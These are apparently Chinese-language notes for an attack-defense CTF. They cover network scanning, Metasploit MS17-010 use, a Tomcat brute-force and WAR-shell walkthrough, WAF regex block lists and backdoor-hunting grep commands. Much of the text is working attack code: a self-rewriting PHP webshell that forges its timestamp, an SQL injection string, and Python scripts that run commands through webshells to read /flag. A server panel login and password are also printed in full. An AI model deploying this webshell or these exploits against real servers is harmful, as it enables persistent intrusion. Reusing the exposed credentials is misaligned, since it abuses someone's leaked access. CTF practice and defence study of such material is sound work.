cd /var/www/html 

tar -zcvf ~/html.tar.gz *



rm -rf /var/www/html 

tar -zxvf ~/html.tar.gz -C /var/www/html



fscan.exe -h 192.168.1.1/24

sudo nmap --script=vuln 192.168.1.9



search ms01710

use 0

set  RHOST 192.168.1.9



<font style="color:rgb(77, 77, 77);">/.test.php?pass=test</font>

<font style="color:rgb(77, 77, 77);">密码：test</font>

```python

<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.test.php';
    $code = '<?php if(md5($_GET["pass"])=="098f6bcd4621d373cade4e832627b4f6"){@eval($_POST[test]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .test.php');
        usleep(5000);
    }
?>
```



### sql注入
admin' or 1=1 #

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1760069337401-c92ab5c5-1ecf-4044-9a9d-a5b3c3b83170.png)



排查后门

find / -name "文件名包含文字*"   find / -name "php*"

find / -name '*.php

find . -name '.php' | xargs grep -n 'eval('  
find . -name '.php' | xargs grep -n 'assert('  
find . -name '*.php' | xargs grep -n 'system('



find . -name '.php' |  grep -n 'eval('



起服务器

```python
========================面板账户登录信息==========================

 【云服务器】请在安全组放行 33351 端口
 外网面板地址: http://2409:8903:6084:3440:36f6:7a27:d5e1:494c:33351/16ca9a38
 内网面板地址: http://192.168.62.106:33351/16ca9a38
 username: pcmego9i
 password: 6412a87b

 浏览器访问以下链接，添加宝塔客服
 https://www.bt.cn/new/wechat_customer
==================================================================


```

 tar -zcvf html.tar.gz html

### waf
```python
function wafrce($str){
	return !preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str);
}

function wafsqli($str){
	return !preg_match("/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|<|;|\"|\'|\^|\|/i", $str);
}

function wafxss($str){
	return !preg_match("/\'|http|\"|\`|cookie|<|>|script/i", $str);
}

正则
		if (strpos($pic, "flag") !== false) {
			$pic = '';
		}

```



### 一句话木马利用
exp.sh

#!/bin/bash

ip=$1

port= $2

python3 ./exp.py $ip $port

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    pass

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
}
url = f"http://{HOST}:{PORT}"
data = {"1": "system('cat /flag');"}

def exp_1():
    ans = requests.post(url=url, headers=header, data=data)
    print(ans.text)

exp_1() 
```

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    print("Usage: python3 exp.py <host> <port>")
    sys.exit(1)

url = f"http://{HOST}:{PORT}"

def exp_3():
    target_url = f"{url}/uploads/admin/201910/this_is_big.php"
    payload = {'x': 'cat /flag'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    print("[*] Trying exp_3...")
    try:
        response = requests.post(target_url, headers=headers, data=payload)
        print("[+] exp_3 response:")
        print(response.text)
    except Exception as e:
        print(f"[-] exp_3 failed: {e}")

# 执行函数
exp_3()
```

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    print("Usage: python3 exp.py <host> <port>")
    sys.exit(1)

url = f"http://{HOST}:{PORT}"

def exp_4():
    print("\n[*] Trying exp_4 (GET parameter exploitation)...")
    
    # 尝试几个可能的路径
    possible_paths = [
        "/shell.php",
        "/cmd.php", 
        "/backdoor.php",
        "/uploads/shell.php",
        "/uploads/cmd.php",
        "/admin/shell.php",
        "/admin/cmd.php",
        "/inc/shell.php",
        "/tmp/shell.php",
        "/web-shell.php",
        "/x.php",
        "/a.php",
        "/"
    ]
    
    for path in possible_paths:
        target_url = f"{url}{path}"
        
        # 使用system('cat /flag')命令
        params = {'cmd': "system('cat /flag');"}
        
        try:
            print(f"[*] Testing {target_url}")
            response = requests.get(target_url, params=params, timeout=5)
            
            # 检查响应
            if response.status_code == 200 and response.text.strip():
                print(f"[+] SUCCESS with {target_url}!")
                print(f"[+] Response: {response.text.strip()}")
                return True
                
        except Exception as e:
            print(f"[-] Failed to connect to {target_url}: {e}")
    
    print("[-] exp_4 failed: No working path found")
    return False

# 执行函数
if __name__ == "__main__":
    exp_4()
```

### 打包方法
```python
cd exp/    
zip exp.zip *

    patch/    
    --patch.sh(必须)    
    --patch.py    
    --other_dependency​   

cd patch/    
zip patch.zip *​
```

### 任意文件读取
exp.sh

#!/bin/bash

ip=$1

port= $2

python3 ./exp.py $ip $port

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    pass

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
}
url = f"http://{HOST}:{PORT}"

def exp_2(poc="/templates/default/common/404.php?a=system&b=cat /flag"):
    ans = requests.post(url=url+poc, headers=header, data=data)
    print(ans.text)

exp_2()
```

###  web修复
<font style="color:rgba(0, 0, 0, 0.85);">patch.sh</font>

```bash
cp -f ./index.php /var/www/html/index.php
```

```python
rm -f /var/www/html/index.php  
cp ./index.php /var/www/html/index.php
```



tomcat密码暴破序列,MSF暴破Tomcat管理后台密码

实操界面：

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764225869770-67e68eb1-e4c8-4f51-b82c-8b021ceb581d.png)

** **<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764225829766-f546aa65-3852-422f-8056-949e5cd276bf.png)

密码爆破成功界面展示：

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764226004769-7a7661f0-3f1f-4170-8779-62bdecebf1aa.png)

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764226022473-f840aaf5-fec5-4eb4-8f91-89de8bb8e1f6.png)

掌握MSF利用Tomcat管理后台上传Java木马。

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764226675556-6795eced-ee78-4cfd-b0ac-af7e4d701da5.png)

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764226719865-4935215f-40c2-4239-b12e-db3a142ac1c5.png)

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764226736479-030b47c3-c8b3-4f45-b563-e0d327625cf1.png)

在Kali端制作tomcat后台getshell

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764226843148-1d23ac93-d5c4-47af-9298-799a698929e3.png)

向tomcat网站部署kali.war程序包

Kali端上线成功，如下图

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764260229252-8c7e2ddd-54f1-4dce-8da7-74a6805ceb74.png)

(5)  实施Ubuntu内核漏洞提权。

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764260461977-3799fac0-c641-4a6b-9963-12940d0398ae.png)

建立反弹连接后，系统的状态 

要想获得更高的系统内操作权利，必须要提升权限！！！

编译并上传

在Kali系统内操作如下：

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764262338530-06f54950-9158-451e-9568-07d982de0f51.png)

<!-- 这是一张图片，ocr 内容为： -->
![](图片\msf\1764262359322-83755f76-4754-4500-8837-fa2676aa9601.png)

